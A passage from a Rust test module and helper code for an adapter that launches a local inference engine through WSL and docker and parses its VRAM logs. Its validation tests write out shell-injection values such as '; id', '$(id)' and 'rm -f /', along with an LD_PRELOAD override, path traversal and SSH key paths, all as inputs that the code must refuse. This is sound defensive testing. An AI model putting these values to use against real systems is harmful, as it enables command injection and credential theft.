                    expect_status: 200,
                }),
                Box::new(ReadinessSpec::Http {
                    path: "/v1/models".to_string(),
                    expect_status: 200,
                }),
            )
        );
    }

    #[test]
    fn profile_and_key_flags_pass_through() {
        let spec = NinferAdapter::new("U2", "usr")
            .spec(
                &entry(&[
                    ("ninfer_autostart", "/s.sh"),
                    ("ninfer_container", "c"),
                    ("ninfer_profile", "a"),
                    ("ninfer_key", "true"),
                ]),
                18110,
            )
            .expect("valid spec");
        assert_eq!(
            spec.argv[2..],
            ["U2", "-u", "usr", "--", "bash", "/s.sh", "a", "key", "18110"]
        );
    }

    /// Pin of the `cpu_offload` engine scoping: the ninfer adapter reads only
    /// `ninfer_autostart`/`ninfer_container`/`ninfer_profile`/`ninfer_key` — the
    /// key is inert for this engine, so absent, `true` and `false` must produce a
    /// byte-identical [`LaunchSpec`] (argv, env, readiness, cwd, container alike).
    /// Falsifier: if this adapter starts reading the key, the equality fails here.
    #[test]
    fn cpu_offload_changes_nothing_for_a_ninfer_launch() {
        let base = NinferAdapter::new("Ubuntu", "ops")
            .spec(
                &entry(&[("ninfer_autostart", "/s.sh"), ("ninfer_container", "c")]),
                18109,
            )
            .expect("absent key");
        for value in ["true", "false"] {
            let spec = NinferAdapter::new("Ubuntu", "ops")
                .spec(
                    &entry(&[
                        ("ninfer_autostart", "/s.sh"),
                        ("ninfer_container", "c"),
                        ("cpu_offload", value),
                    ]),
                    18109,
                )
                .expect("an inert key never refuses a launch");
            assert_eq!(
                spec, base,
                "cpu_offload: {value} must change nothing — if the ninfer adapter \
                 starts reading the key, this fails"
            );
        }
    }

    #[test]
    fn missing_required_keys_are_refusals_not_panic() {
        let err = NinferAdapter::new("Ubuntu", "ops")
            .spec(&entry(&[("ninfer_container", "c")]), 18109)
            .expect_err("must refuse");
        match err {
            EngineError::MissingField { field, .. } => assert_eq!(field, "ninfer_autostart"),
            other => panic!("expected a MissingField refusal, got {other:?}"),
        }
        let err = NinferAdapter::new("Ubuntu", "ops")
            .spec(&entry(&[("ninfer_autostart", "/s.sh")]), 18109)
            .expect_err("must refuse");
        match err {
            EngineError::MissingField { field, .. } => assert_eq!(field, "ninfer_container"),
            other => panic!("expected a MissingField refusal, got {other:?}"),
        }
    }

    /// FINDINGS2-0910 [6]: `~` is shell-active at a word start, so the login shell
    /// that re-tokenizes everything after `wsl.exe --` would expand `~root/x.sh` to
    /// `/root/x.sh` and `~/x.sh` to the wsl_user's home — a yaml word that reads
    /// like an absolute path but names a file the operator never wrote. Both
    /// autostart and profile words are held to the same rule; the live catalog's
    /// paths are all absolute, so nothing legitimate depends on `~`.
    #[test]
    fn tilde_expanding_words_are_refused() {
        for script in ["~root/guide/x/autostart.sh", "~/autostart.sh", "~"] {
            let reason = refused(&[("ninfer_autostart", script), ("ninfer_container", "c")]);
            assert!(reason.contains("plain WSL path"), "{script}: {reason}");
        }
        let reason = refused(&[
            ("ninfer_autostart", "/s.sh"),
            ("ninfer_container", "c"),
            ("ninfer_profile", "~b"),
        ]);
        assert!(reason.contains("ninfer_profile"), "{reason}");
        // The rule is the character class, not a simulation of bash's expansion
        // positions: an interior `~` (inert to bash, legal as a filename) is refused
        // too. Deliberately stricter — one charset, no shell-context reasoning
        // required of the next reader — and no live autostart path needs it.
        let reason = refused(&[
            ("ninfer_autostart", "/home/u/a~b/autostart.sh"),
            ("ninfer_container", "c"),
        ]);
        assert!(reason.contains("plain WSL path"), "{reason}");
    }

    #[test]
    fn external_key_is_inert_now() {
        // Operator call 2026-10-26 scrapped `external: true`: a copied-back v3.3
        // yaml must be managed, not refused — the key carries no meaning here.
        let spec = NinferAdapter::new("Ubuntu", "ops")
            .spec(
                &entry(&[
                    ("ninfer_autostart", "/s.sh"),
                    ("ninfer_container", "c"),
                    ("external", "true"),
                ]),
                18109,
            )
            .expect("managed");
        assert_eq!(spec.container.as_deref(), Some("c"));
    }

    /// The reason one hostile `raw` value earns, or a panic naming a value that was
    /// wrongly admitted (the three shape rules share one refusal voice, so the tests
    /// share one probe).
    fn refused(pairs: &[(&str, &str)]) -> String {
        match NinferAdapter::new("Ubuntu", "ops").spec(&entry(pairs), 18109) {
            Err(EngineError::Rejected { reason, engine, .. }) => {
                assert_eq!(engine, NINFER_ENGINE);
                reason
            }
            other => panic!("expected a Rejected refusal, got {other:?}"),
        }
    }

    #[test]
    fn option_and_shell_shaped_values_are_refused_before_argv() {
        // The argv after `wsl.exe --` is re-tokenized by the login shell inside the
        // distro, so a yaml value is only safe as a plain word (security review,
        // 2026-10-26): option-shaped, spaced and metacharacter-bearing values die here.
        for bad in ["-c", "/s.sh; id", "/s$(id).sh", "/s.sh|sh", "/a b.sh"] {
            let reason = refused(&[("ninfer_autostart", bad), ("ninfer_container", "c")]);
            assert!(reason.contains("plain WSL path"), "{bad}: {reason}");
        }
        let reason = refused(&[
            ("ninfer_autostart", "/s.sh"),
            ("ninfer_container", "c"),
            ("ninfer_profile", "b; id"),
        ]);
        assert!(reason.contains("ninfer_profile"), "{reason}");
        for name in ["-v", "_x", "a b"] {
            let reason = refused(&[("ninfer_autostart", "/s.sh"), ("ninfer_container", name)]);
            assert!(reason.contains("docker name"), "{name}: {reason}");
        }
    }

    #[test]
    fn container_names_docker_could_resolve_as_an_id_are_refused() {
        // Chunk 10 [4]: `docker rm -f <hex>` is resolved as a container-**ID prefix**, so
        // a name of that shape must die here — the same validator the boot reclaim and
        // the claim ledger use — before it can reach the pre-reap argv and delete an
        // unrelated container in the operator's distro.
        for name in ["1234abc", "beef", "deadbeef"] {
            let reason = refused(&[("ninfer_autostart", "/s.sh"), ("ninfer_container", name)]);
            assert!(reason.contains("docker name"), "{name}: {reason}");
        }
        assert_eq!(
            NinferAdapter::new("Ubuntu", "ops")
                .spec(
                    &entry(&[("ninfer_autostart", "/s.sh"), ("ninfer_container", "c")]),
                    18109,
                )
                .expect("a short name is not an id shape")
                .container
                .as_deref(),
            Some("c"),
            "a one-character hex name must still load: the load path stays intact"
        );
    }

    #[test]
    fn key_flag_uses_the_shared_truthy_table() {
        for value in ["true", "1", "yes", "on"] {
            let spec = NinferAdapter::new("Ubuntu", "ops")
                .spec(
                    &entry(&[
                        ("ninfer_autostart", "/s.sh"),
                        ("ninfer_container", "c"),
                        ("ninfer_key", value),
                    ]),
                    18109,
                )
                .expect("valid spec");
            assert_eq!(spec.argv[9], "key", "ninfer_key: {value}");
        }
        let spec = NinferAdapter::new("Ubuntu", "ops")
            .spec(
                &entry(&[
                    ("ninfer_autostart", "/s.sh"),
                    ("ninfer_container", "c"),
                    ("ninfer_key", "off"),
                ]),
                18109,
            )
            .expect("valid spec");
        assert_eq!(spec.argv[9], "nokey");
    }

    /// The template keys as a live yaml would spell them (the operator's swift row,
    /// transcribed): every launch in the new world carries these, and nothing else.
    fn template_pairs() -> Vec<(&'static str, &'static str)> {
        vec![
            ("ninfer_container", "ninfer-x"),
            ("ninfer_image", "ninfer:local"),
            (
                "ninfer_model_name",
                "Swift-1.5-Qwen3.8-27B-Uncensored-NVFP4-NInfer",
            ),
            (
                "ninfer_artifact",
                "Swift_1_5_qwen3_8_27b_uncensored_nvfp4.ninfer",
            ),
            ("ninfer_internal_port", "8090"),
            (
                "ninfer_model_roots",
                "/mnt/d/Models,/home/legislat/ai/models",
            ),
            (
                "ninfer_serve_args",
                "--spec dflash2 --draft-tokens 7 --vision",
            ),
        ]
    }

    /// The parsers of BOTH shipped images reject the `--flag=value` form
    /// (`unknown argument: --spec=dflash2`, manual test 2026-11-01), so the
    /// space form the operator's verified scripts used must stay spellable:
    /// an option token plus its bare value token, each quoted at substitution.
    /// Falsifier: a validation that still demands every token be option-shaped
    /// refuses `dflash2`, and the working launch line becomes inexpressible.
    #[test]
    fn serve_args_carries_the_space_form_the_parsers_actually_parse() {
        let mut pairs = template_pairs();
        pairs.retain(|(k, _)| *k != "ninfer_serve_args");
        pairs.push((
            "ninfer_serve_args",
            "--spec dflash2 --draft-tokens 5 --max-pending-requests 64",
        ));
        let spec = NinferAdapter::new("Ubuntu", "ops")
            .spec(&entry(&pairs), 18109)
            .expect("space-form serve args");
        let script = spec.script.expect("template renders");
        assert!(
            script.contains("\"--spec\" \"dflash2\" \"--draft-tokens\" \"5\""),
            "{script}"
        );
        assert!(script.contains("\"64\""), "{script}");
        // A value may never masquerade as an option: single-dash tokens and
        // anything extending a harness-owned name are still refused.
        for bad in ["-x 5", "--host 0.0.0.0", "--data-dir-permissions /x"] {
            let mut pairs = template_pairs();
            pairs.retain(|(k, _)| *k != "ninfer_serve_args");
            pairs.push(("ninfer_serve_args", bad));
            let reason = refused(&pairs);
            assert!(reason.contains("ninfer_serve_args"), "{bad}: {reason}");
        }
    }

    /// An override line naming a BUILT-IN profile can never be read (the table
    /// answers built-ins first; overrides apply only to custom names), and the
    /// manual test caught what silence did with that: the yaml promised
    /// int8/conc 2, the launch shipped fp8/conc 1. Falsifier: drop the refusal
    /// and the dead key parses as success while the numbers it names never
    /// reach the script.
    #[test]
    fn an_override_line_naming_a_built_in_profile_is_refused_not_ignored() {
        for (selected, dead) in [("b", "ninfer_profile_b"), ("card", "ninfer_profile_b")] {
            let mut pairs = template_pairs();
            pairs.push(("ninfer_profile", selected));
            if selected == "card" {
                pairs.push(("ninfer_profile_card", "ctx=16384 kv=16384 conc=1"));
            }
            pairs.push((dead, "ctx=262144 kv=262144 conc=2 kv_dtype=int8"));
            let reason = refused(&pairs);
            assert!(reason.contains(dead), "{selected}/{dead}: {reason}");
            assert!(reason.contains("built-in"), "{selected}/{dead}: {reason}");
        }
    }

    /// Legacy rows refuse the dead built-in-name override too, even though the
    /// legacy path never resolves an override (the README promises the refusal
    /// at launch in EITHER mode; review L-2). Falsifier: a legacy branch that
    /// accepts the line while only the template path refuses.
    #[test]
    fn legacy_mode_refuses_the_dead_built_in_override_key_too() {
        let error = NinferAdapter::new("Ubuntu", "ops")
            .spec(
                &entry(&[
                    ("ninfer_autostart", "/s.sh"),
                    ("ninfer_container", "c"),
                    (
                        "ninfer_profile_b",
                        "ctx=262144 kv=262144 conc=2 kv_dtype=int8",
                    ),
                ]),
                18109,
            )
            .expect_err("a dead override key must refuse in legacy mode too");
        assert!(
            format!("{error}").contains("ninfer_profile_b"),
            "the refusal must name the key: {error}"
        );
    }

    /// The `ninfer_env` allow-list is a review gate, not a parse rule: the one
    /// card-verified flag reaches the container quoted and complete, and an
    /// arbitrary `NAME` — `LD_PRELOAD`, `PATH` — is refused by name. Falsifier:
    /// widening the check to any `NAME=VALUE` shape makes the refusals land, and
    /// dropping the render substitution makes the acceptance leg land.
    #[test]
    fn ninfer_env_admits_only_the_allow_listed_pair() {
        let mut pairs = template_pairs();
        pairs.push(("ninfer_env", "CUDA_MODULE_LOADING=LAZY"));
        let spec = NinferAdapter::new("Ubuntu", "ops")
            .spec(&entry(&pairs), 18109)
            .expect("allow-listed env");
        let script = spec.script.expect("template renders");
        assert!(
            script.contains("--env \"CUDA_MODULE_LOADING=LAZY\""),
            "{script}"
        );
        assert!(!script.contains("{{"), "no placeholder survives");

        for bad in [
            "CUDA_MODULE_LOADING",
            "CUDA_MODULE_LOADING=eager",
            "CUDA_MODULE_LOADING=LAZY;rm -f /",
            "LD_PRELOAD=/x.so",
            "PATH=/tmp/bin",
            "CUDA_MODULE_LOADING=LAZY CUDA_MODULE_LOADING=EAGER PATH=/tmp",
        ] {
            let mut pairs = template_pairs();
            pairs.push(("ninfer_env", bad));
            let reason = refused(&pairs);
            assert!(reason.contains("ninfer_env"), "{bad}: {reason}");
        }

        // Absent key: the line disappears cleanly, leaving no dangling continuation.
        let spec = NinferAdapter::new("Ubuntu", "ops")
            .spec(&entry(&template_pairs()), 18109)
            .expect("no env");
        let script = spec.script.expect("template renders");
        assert!(!script.contains("--env"), "{script}");
        assert!(
            script.contains("--log-opt max-file=5 \\\n  \"$IMAGE\""),
            "the run line stays contiguous without an env pair: {script}"
        );
    }

    /// Template adoption (operator ruling 2026-10-31): the launch runs the harness's
    /// own rendered script, staged by the runtime — never an operator file. This pins
    /// the three incident-review properties (`--restart no`, loopback-only publish,
    /// bounded logs), the parameterized body, and the untouched positional contract.
    #[test]
    fn a_template_launch_stages_the_canonical_script_and_holds_the_incident_rules() {
        let spec = NinferAdapter::new("Ubuntu", "ops")
            .spec(&entry(&template_pairs()), 18109)
            .expect("template spec");
        let script = spec
            .script
            .expect("template mode renders a script for staging");
        assert!(script.contains("--restart no"), "{script}");
        assert!(
            script.contains("--publish \"127.0.0.1:${PUBLISH}:${PORT}\""),
            "{script}"
        );
        assert!(
            script.contains("PUBLISH=\"${3:?"),
            "a missing publish argument fails closed instead of host-publishing the internal port: {script}"
        );
        assert!(
            script.contains("--log-opt max-size=25m --log-opt max-file=5"),
            "{script}"
        );
        assert!(
            script.contains("docker rm -f \"$NAME\" >/dev/null 2>&1 || true"),
            "{script}"
        );
        assert!(script.contains("set -euo pipefail"), "{script}");
        assert!(
            !script.contains("unless-stopped"),
            "autostart would survive a WSL boot"
        );
        assert!(script.contains("NAME=\"ninfer-x\""), "{script}");
        assert!(script.contains("IMAGE=\"ninfer:local\""), "{script}");
        assert!(script.contains("PORT=\"8090\""), "{script}");
        assert!(script.contains("SERVE_CMD=\"ninfer-serve\""), "{script}");
        assert!(script.contains("  \"/mnt/d/Models\""), "{script}");
        assert!(script.contains("\"--spec\" \"dflash2\""), "{script}");
        assert!(script.contains("profile 'b'"), "{script}");
        assert!(
            script.contains("ctx=262144 kv=262144 conc=1 kvdtype=fp8"),
            "{script}"
        );
        assert!(
            !script.contains("--model-id"),
            "undelared id is absent, never guessed"
        );
        assert!(
            !script.contains("{{"),
            "no placeholder survives into a launch"
        );
        // The positional contract the runtime stages against is unchanged: same
        // argv, the script position naming the staged file by its content hash.
        assert_eq!(&spec.argv[..5], &["wsl.exe", "-d", "Ubuntu", "-u", "ops"]);
        assert_eq!(&spec.argv[5..7], &["--", "bash"]);
        assert!(spec.argv[7].starts_with("ninfer-x-") && spec.argv[7].ends_with(".sh"));
        assert_eq!(&spec.argv[8..], &["b", "nokey", "18109"]);
        let expected = format!(
            "ninfer-x-{:016x}.sh",
            crate::process::script_content_hash(script.as_str())
        );
        assert_eq!(
            spec.argv[7], expected,
            "argv names the bytes that will be staged"
        );
        assert_eq!(spec.container.as_deref(), Some("ninfer-x"));
    }

    /// R10 (operator 2026-11-01): the container's inside is a third namespace. A
    /// row without `ninfer_internal_port` renders the SE internal number (8808,
    /// the harness's 87xx family at +100), and the gate's namespace helper
    /// reports exactly the number the template would bind — never inventing one
    /// for a row the adapter will refuse.
    #[test]
    fn an_internal_port_defaults_to_the_internal_number_and_the_helper_follows_the_yaml() {
        let without = {
            let mut pairs = template_pairs();
            pairs.retain(|(key, _)| *key != "ninfer_internal_port");
            entry(&pairs)
        };
        let spec = NinferAdapter::new("Ubuntu", "ops")
            .spec(&without, 18109)
            .expect("the key is optional");
        let script = spec.script.expect("template renders");
        assert!(script.contains("PORT=\"8808\""), "{script}");
        assert_eq!(declared_internal_port(&without), Some(8808));
        assert_eq!(
            declared_internal_port(&entry(&template_pairs())),
            Some(8090),
            "a declared number is the number"
        );
        let mut broken = template_pairs();
        broken.retain(|(key, _)| *key != "ninfer_internal_port");
        broken.push(("ninfer_internal_port", "80a4"));
        assert_eq!(
            declared_internal_port(&entry(&broken)),
            None,
            "an unparseable row has no number to claim: spawn refuses it naming the key"
        );
    }

    #[test]
    fn a_custom_profile_rides_the_override_key_and_the_stamp_names_it() {
        let mut pairs = template_pairs();
        pairs.push(("ninfer_profile", "lt"));
        pairs.push((
            "ninfer_profile_lt",
            "ctx=16384 kv=32768 conc=2 kv_dtype=nvfp4",
        ));
        let spec = NinferAdapter::new("Ubuntu", "ops")
            .spec(&entry(&pairs), 18109)
            .expect("custom profile spec");
        let script = spec.script.expect("rendered");
        assert!(script.contains("profile 'lt'"), "{script}");
        assert!(
            script.contains("ctx=16384 kv=32768 conc=2 kvdtype=nvfp4"),
            "{script}"
        );
        assert!(script.contains("override:ninfer_profile_lt"), "{script}");
    }

    /// The reference script shipped beside the README must teach exactly the R10
    /// separation the canonical renders. `ec310a5` corrected it by hand; this pin is
    /// what makes the next drift fail at the gate instead of in a review (F4).
    #[test]
    fn the_shipped_reference_template_teaches_the_separation() {
        let shipped = include_str!("../../ninfer-autostart-template.sh");
        assert!(
            shipped.contains("INTERNAL_PORT=8808"),
            "the shipped reference must teach the R10 default internal port"
        );
        assert!(
            shipped.contains("${3:?"),
            "the shipped reference must fail closed when the harness omits arg 3"
        );
        assert!(
            !shipped.contains("${3:-"),
            "the legacy fallback would host-publish the internal port on a missing arg 3"
        );
        assert!(
            !shipped.contains("8004") && !shipped.contains("8005"),
            "legacy manual-namespace internal ports must not survive in the reference"
        );
    }

    /// Fail-closed doctrine for the launch surface: a yaml cannot steer the container
    /// with anything the validators do not name. Each leg is a distinct substitution
    /// site; the falsifier for every one is deleting its check.
    #[test]
    fn template_values_are_refused_by_naming_the_key() {
        for (key, value, needle) in [
            ("ninfer_image", "ninfer:local; id", "ninfer_image"),
            ("ninfer_model_name", "evil name", "ninfer_model_name"),
            (
                "ninfer_artifact",
                "../../Windows/system32/drivers/etc/passwd.ninfer",
                "traversal",
            ),
            (
                "ninfer_model_roots",
                "/mnt/d/Models/../Windows",
                "traversal",
            ),
            ("ninfer_internal_port", "80a4", "ninfer_internal_port"),
            ("ninfer_internal_port", "99999", "ninfer_internal_port"),
            ("ninfer_model_roots", "mnt/d/Models", "absolute"),
            ("ninfer_model_roots", "/mnt/d/Models,$(id)", "absolute"),
            ("ninfer_serve_args", "--host 0.0.0.0", "harness-owned flag"),
            (
                "ninfer_serve_args",
                "--api-key=sk-leak",
                "harness-owned flag",
            ),
            (
                "ninfer_serve_args",
                "--max-context=32768",
                "harness-owned flag",
            ),
            ("ninfer_serve_args", "--kv-capacity", "harness-owned flag"),
            ("ninfer_serve_args", "--kv-dtype=fp16", "harness-owned flag"),
            ("ninfer_serve_args", "--host=0.0.0.0", "harness-owned flag"),
            // Abbreviations resolve on argparse-style parsers, so a strict prefix
            // of a harness-owned flag is that flag to `ninfer-serve` (F2-0910's
            // llama deny-list leak is the in-repo precedent for refusing anyway).
            (
                "ninfer_serve_args",
                "--max-cont=1000000",
                "harness-owned flag",
            ),
            ("ninfer_serve_args", "--kv-cap", "harness-owned flag"),
            ("ninfer_serve_args", "--mode", "harness-owned flag"),
            ("ninfer_serve_args", "--spec;rm -f /", "shell-bare"),
            ("ninfer_serve_args", "--spec \"x\"", "shell-bare"),
            ("ninfer_serve_args", "-x", "shell-bare"),
            ("ninfer_gpu_device", "0 1", "ninfer_gpu_device"),
            ("ninfer_gpu_device", "0;id", "ninfer_gpu_device"),
            ("ninfer_model_id", "a b", "ninfer_model_id"),
            ("ninfer_key_file", "~/keys/x.key", "ninfer_key_file"),
            ("ninfer_key_file", "$HOME/keys/x;id.key", "ninfer_key_file"),
            (
                "ninfer_key_file",
                "/home/legislat/.ssh/id_rsa",
                "$HOME/.simplehar/keys/",
            ),
            (
                "ninfer_key_file",
                "$HOME/.simplehar/keys/../../.ssh/id_rsa.key",
                "$HOME/.simplehar/keys/",
            ),
            (
                "ninfer_key_file",
                "$HOME/.simplehar/keys/sub/x.key",
                "$HOME/.simplehar/keys/",
            ),
            ("ninfer_serve_cmd", "bash -c id", "ninfer_serve_cmd"),
        ] {
            let mut pairs = template_pairs();
            pairs.retain(|(k, _)| *k != key);
            pairs.push((key, value));
            let reason = refused(&pairs);
            assert!(reason.contains(needle), "{key}={value}: {reason}");
        }
    }

    #[test]
    fn a_profile_override_must_be_complete_and_bounded() {
        for (override_line, needle) in [
            ("ctx=16384 conc=2 kv_dtype=fp8", "missing field `kv`"),
            (
                "ctx=999999999999 kv=999999999999 conc=1 kv_dtype=fp8",
                "whole number in",
            ),
            ("ctx=32768 kv=16384 conc=1 kv_dtype=fp8", "no KV pool for"),
            ("ctx=16384 kv=32768 conc=1 kv_dtype=quantum", "kv_dtype"),
            ("ctx=16384 kv=32768 conc=99 kv_dtype=fp8", "whole number in"),
            ("ctx 16384 kv=32768 conc=1 kv_dtype=fp8", "key=value"),
        ] {
            let mut pairs = template_pairs();
            pairs.push(("ninfer_profile", "lt"));
            pairs.push(("ninfer_profile_lt", override_line));
            let reason = refused(&pairs);
            assert!(reason.contains(needle), "{override_line}: {reason}");
        }
        // The legal spelling of the first row: absent kv_dtype defaults to fp8.
        let mut pairs = template_pairs();
        pairs.push(("ninfer_profile", "lt"));
        pairs.push(("ninfer_profile_lt", "ctx=16384 kv=32768 conc=2"));
        let spec = NinferAdapter::new("Ubuntu", "ops")
            .spec(&entry(&pairs), 18109)
            .expect("kv_dtype defaults to fp8");
        assert!(spec.script.expect("rendered").contains("kvdtype=fp8"));

        // The two dtypes the operator's live cards demand (Qwen3.8/Swift int8
        // with the fast-prefill kernel, Bonsai rk8v4) must stay admissible —
        // these lines are transcribed from the legacy scripts' verified launches.
        for dtype in ["int8", "rk8v4"] {
            let line = format!("ctx=262144 kv=262144 conc=2 kv_dtype={dtype}");
            let mut pairs = template_pairs();
            pairs.push(("ninfer_profile", "card"));
            pairs.push(("ninfer_profile_card", line.as_str()));
            let spec = NinferAdapter::new("Ubuntu", "ops")
                .spec(&entry(&pairs), 18109)
                .unwrap_or_else(|_| panic!("{dtype} must be admissible: the live yamls ship it"));
            assert!(
                spec.script
                    .expect("rendered")
                    .contains(&format!("kvdtype={dtype}")),
                "{dtype}"
            );
        }
    }

    #[test]
    fn a_profile_named_outside_the_shape_or_without_its_override_is_refused() {
        let mut pairs = template_pairs();
        pairs.push(("ninfer_profile", "LT"));
        assert!(refused(&pairs).contains("ninfer_profile"));
        // A custom name the operator never defined is a MissingField naming the
        // exact override key to write — the same voice the required template keys
        // use, so the page says precisely what is absent.
        let mut pairs = template_pairs();
        pairs.push(("ninfer_profile", "f"));
        match NinferAdapter::new("Ubuntu", "ops").spec(&entry(&pairs), 18109) {
            Err(EngineError::MissingField { field, .. }) => {
                assert_eq!(field, "ninfer_profile_f");
            }
            other => panic!("expected a MissingField naming the override key, got {other:?}"),
        }
    }

    #[test]
    fn image_and_autostart_declared_together_is_a_refusal_not_a_priority() {
        let mut pairs = template_pairs();
        pairs.push(("ninfer_autostart", "/s.sh"));
        let reason = refused(&pairs);
        assert!(reason.contains("mutually exclusive"), "{reason}");
    }

    #[test]
    fn a_template_launch_names_the_key_file_it_will_read_and_never_the_secret() {
        let mut pairs = template_pairs();
        pairs.push(("ninfer_key", "true"));
        let spec = NinferAdapter::new("Ubuntu", "ops")
            .spec(&entry(&pairs), 18109)
            .expect("key mode renders");
        let script = spec.script.expect("rendered");
        assert!(
            script.contains("API_KEY_FILE=\"$HOME/.simplehar/keys/ninfer-x.key\""),
            "{script}"
        );
        assert!(script.contains("missing or empty"), "{script}");
        // The rendered bytes are about to be staged and logged: a key value must
        // never be inside them — every `--api-key` occurrence is the command
        // substitution text, so the secret is read by the container at launch and
        // the staged file can sit in a world-readable directory unashamed.
        for (index, _) in script.match_indices("--api-key") {
            let tail = &script[index..];
            assert!(
                tail.starts_with("--api-key \"$(cat \"$API_KEY_FILE\")\""),
                "the render embedded a literal key: {tail}"
            );
        }
    }

    /// The compatibility path: a yaml that predates the template still launches,
    /// byte-identically to the pre-template contract, and carries no staged script —
    /// the runtime runs the operator's file verbatim because that is what the yaml
    /// declares. Falsifier: defaulting template mode on would break this pin.
    #[test]
    fn legacy_autostart_is_verbatim_script_none_and_argv_identical() {
        let spec = NinferAdapter::new("Ubuntu", "ops")
            .spec(
                &entry(&[("ninfer_autostart", "/s.sh"), ("ninfer_container", "c")]),
                18109,
            )
            .expect("legacy spec");
        assert_eq!(
            spec.script, None,
            "no render: the operator's script runs verbatim"
        );
        assert_eq!(spec.argv[7], "/s.sh");
        assert_eq!(&spec.argv[8..], &["b", "nokey", "18109"]);
    }
}

/// Bytes in one GiB.
const GIB: f64 = 1024.0 * 1024.0 * 1024.0;

/// The device VRAM the engine reported reserving for itself at startup (R9). Parsed
/// from `docker logs <name>` — the only place the `MemorySummary` survives for a
/// detached container (the harness client log holds just the dead `wsl.exe` client).
#[derive(Debug, Clone, PartialEq)]
pub struct EngineReport {
    /// GiB that must be free to run this model safely: the larger of the
    /// startup-record reserve (pools + graphs + slack) and the post-ready
    /// resident footprint (`weights ready` + `runtime`, ruling 2026-11-01 —
    /// the engine's own word, read after the weight stream landed).
    pub required_to_free_gb: f64,
    /// Raw `total_device_memory_bytes` the engine saw (`totalGlobalMem`).
    pub total_device_memory_bytes: u64,
    /// Raw `available_after_startup_bytes` (free device after the engine reserved).
    pub available_after_startup_bytes: u64,
}

/// The engine's own post-ready resident footprint (GiB): `weights ready | W
/// GiB` plus the `runtime R` of the `capacity` line, both from the same
/// `docker logs` stream as [`parse_startup_memory`]. The startup record
/// predates the weight stream, so this is the same container speaking *after*
/// it installed — per-engine and unaffected by other card residents (live
/// proof 2026-11-01: 27.5 + 16.5 = 44.0 against a witness-observed 44.1).
/// Each figure is the LAST occurrence, so a container that restarted in place
/// speaks with its newest voice; `None` when any guard fails.
#[must_use]
pub fn parse_resident_footprint(log: &str) -> Option<f64> {
    resident_figures(log).map(|(resident, _total)| resident)
}

/// `(resident, implied_total)` in GiB from the engine's own post-ready lines.
/// The `runtime`/`free` figures are read ONLY from lines framing a `capacity`
/// record — elsewhere in the log the word `runtime` may ride host memory
/// lines, and host RAM must never reach a VRAM booking (review M-1). Fails
/// (`None`) unless every figure is finite, weights and runtime are positive,
/// free is non-negative, and `W + R <= W + R + F`.
fn resident_figures(log: &str) -> Option<(f64, f64)> {
    let weights = last_gib_after(log, "weights ready")?;
    let (runtime, free) = capacity_runtime_free(log)?;
    let resident = weights + runtime;
    let total = resident + free;
    (weights > 0.0
        && runtime > 0.0
        && free >= 0.0
        && resident.is_finite()
        && total.is_finite()
        && resident <= total)
        .then_some((resident, total))
}

/// The `runtime R GiB` and `free F GiB` figures of the LAST `capacity` line —
/// the engine's only post-ready device statement, anchored there on purpose.
fn capacity_runtime_free(log: &str) -> Option<(f64, f64)> {
    log.lines()
        .rev()
        .filter(|line| line.contains("capacity"))
        .find_map(|line| {
            let runtime = gib_in_line(line, "runtime")?;
            let free = gib_in_line(line, "free")?;
            (runtime > 0.0 && free >= 0.0 && runtime.is_finite() && free.is_finite())
                .then_some((runtime, free))
        })
}

/// The GiB amount in the LAST line with a usable figure under `label` (e.g.
/// `weights ready | 27.5 GiB`). Lines carrying the label without a parseable
/// figure are skipped, not fatal: the newest *readable* voice wins.
fn last_gib_after(log: &str, label: &str) -> Option<f64> {
    log.lines()
        .rev()
        .filter_map(|line| gib_in_line(line, label))
        .next()
}

/// The GiB figure under `label` within ONE line: the number immediately
/// followed by the first `GiB` after the label's last occurrence.
fn gib_in_line(line: &str, label: &str) -> Option<f64> {
    let at = line.rfind(label)? + label.len();
    let rest = &line[at..];
    let gib = rest.find("GiB")?;
    let number = rest[..gib].split_whitespace().last()?.replace(',', "");
    number.parse::<f64>().ok().filter(|v| *v >= 0.0)
}

/// Pull the engine's startup device-memory accounting out of `docker logs` output.
/// The operational/request log writes each record as a JSON object; we take the
/// **last** object that carries both `total_device_memory_bytes` and
/// `available_after_startup_bytes` (a container can restart in place, so the newest
/// startup wins). `None` when no such record is present — the caller then falls back
/// to a labelled, never-booked total-diff (§5.2). This is the engine-specific half of
/// R9; `ProcessRuntime::container_report` stays a generic `docker logs` passthrough.
#[must_use]
pub fn parse_startup_memory(log: &str) -> Option<EngineReport> {
    let mut found: Option<EngineReport> = None;
    for record in json_objects(log) {
        let total = lookup_u64(&record, &["environment", "total_device_memory_bytes"])
            .or_else(|| lookup_u64(&record, &["total_device_memory_bytes"]));
        let available = lookup_u64(&record, &["memory", "available_after_startup_bytes"])
            .or_else(|| lookup_u64(&record, &["available_after_startup_bytes"]));
        let (Some(total), Some(available)) = (total, available) else {
            continue;
        };
        if total == 0 || available > total {
            continue;
        }
        let total_gib = total as f64 / GIB;
        // Over-reserve basis: card total minus what was still free after the engine
        // reserved its pools. Clamped so a nonsense reading never books.
        let required = (total_gib - available as f64 / GIB).clamp(0.0, total_gib);
        if required <= 0.0 || !required.is_finite() {
            continue;
        }
        // The startup record is written BEFORE the weight stream lands (live proof
        // 2026-11-01: qwen-fp8 reserved 32.0 GiB at startup and installed 44.1).
        // The engine's own post-ready lines are per-engine, post-load and immune
        // to whatever else occupies the card, so the booking takes the larger
        // figure (ruling 2026-11-01: the engine's word, read at ready).
        let required = match parse_resident_footprint(log) {
            Some(resident) if resident.is_finite() && resident > 0.0 && resident <= total_gib => {
                required.max(resident)
            }
            _ => required,
        };
        found = Some(EngineReport {
            required_to_free_gb: required,
            total_device_memory_bytes: total,
            available_after_startup_bytes: available,
        });
    }
    // Both shipped builds write the startup JSON only to the
    // `--request-log-jsonl` ops log, which never reaches `docker logs`
    // (review M-2, live proof 2026-11-01): without this branch the
    // post-ready booking would be dead code on the very boxes it was made
    // for. The implied total comes from the engine's own three post-ready
    // figures, so even the clamp stays the engine's own word.
    if found.is_none() {
        if let Some((resident, total)) = resident_figures(log) {
            found = Some(EngineReport {
                required_to_free_gb: resident,
                total_device_memory_bytes: (total * GIB).round() as u64,
                available_after_startup_bytes: ((total - resident) * GIB).round() as u64,
            });
        }
    }
    found
}

/// Every top-level JSON object in a noisy log, in order — brace-matched with string
/// and escape awareness so a `{`/`}` inside a quoted value never desynchronizes the
/// scan. Non-JSON and malformed spans are skipped.
fn json_objects(log: &str) -> Vec<serde_json::Value> {
    let bytes = log.as_bytes();
    let mut objects = Vec::new();
    let mut depth: usize = 0;
    let mut start = 0usize;
    let mut in_string = false;
    let mut escaped = false;
